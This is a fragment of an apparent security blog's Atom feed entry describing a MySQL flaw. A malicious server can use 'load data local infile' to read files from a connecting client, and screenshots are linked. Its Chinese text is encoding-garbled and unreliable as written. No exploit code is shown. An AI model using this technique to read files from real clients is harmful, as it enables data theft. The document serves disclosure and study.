src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162007-1ca83a22-e35b-1.png" alt="image.png"><br>å®¢æˆ·ç«¯è¿æ¥<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162037-2eb0676c-e35b-1.png" alt="image.png"><br>ä¸€æœ‰è¿æ¥ï¼Œå³å¯è¯»å–åˆ°å®¢æˆ·ç«¯æ–‡ä»¶</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190930162117-463b20de-e35b-1.png" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;æ¼æ´åˆ†æ&quot;&gt;&lt;a href=&quot;#æ¼æ´åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;#æ¼æ´åˆ†æ&quot;&gt;&lt;/a&gt;#æ¼æ´åˆ†æ&lt;/h2&gt;&lt;p&gt;åœ¨mysqlä¸­å¯ä»¥é€šè¿‡&lt;code&gt;load data local infile &amp;quot;/var/lib/mysql-files/test.txt&amp;quot; into table test&lt;/code&gt;å‘½ä»¤ï¼Œå°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ è‡³MySQLæœåŠ¡å™¨ï¼Œå®é™…ä¸Šï¼ŒæœåŠ¡å™¨å¯ä»¥ç›´æ¥å‘å‡ºè¯·æ±‚æ¥è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦ç»è¿‡ç”¨æˆ·åŒæ„ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="web security" scheme="https://lcark.github.io/categories/web-security/"/>
    
    
      <category term="mysql" scheme="https://lcark.github.io/tags/mysql/"/>
    
      <category term="web" scheme="https://lcark.github.io/tags/web/"/>
    
      <category term="client" scheme="https://lcark.github.io/tags/client/"/>
    
  </entry>
  
</feed>
